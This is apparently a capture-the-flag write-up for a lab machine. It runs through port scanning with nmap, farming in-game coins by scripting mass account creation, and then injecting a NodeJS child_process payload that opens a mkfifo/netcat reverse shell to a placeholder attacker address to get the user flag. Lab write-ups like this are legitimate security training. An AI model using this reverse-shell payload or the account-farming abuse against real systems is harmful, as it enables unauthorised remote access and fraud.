# CTF: Around The World

![Difficulty: Hard](https://img.shields.io/badge/difficulty-hard-%23ff0000)
![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP, Hash, Crontab, SSH Key](https://img.shields.io/badge/category-ftp,hash,crontab,sshkey-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre%20%26%20Eloi-%23f9a03c)  
![alt text](img/aroundtheworld.png)
## Description

> Discover the secret track of the famous duo!

## Write-up

UserFlag: user.txt  
RootFlag: root.txt

## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx 1.14.0 (Ubuntu)

MAC Address: 02:85:B5:9A:69:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports, 22 and 80. Let's check the web server on port 80.

```bash
http://$IP
```

We arrive on a page with account and bank system. We can create an account and login.

We have a page `/premiumfeatures.html` with a button to upgrade to premium.

When create account we start with 1 coin and we can buy a premium account for 10000 coins.

We can send gold to other users.

We have to create a script who create 10000 accounts and send gold to our account.

We can now buy a premium account and go to the premium page.

We have a input to enter a code. If we check the site it was an NodeJS site. We can try reverseshell with the code.

```bash
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS PORT >/tmp/f')
```

We have the user flag.

**Well done! You have the user flag!**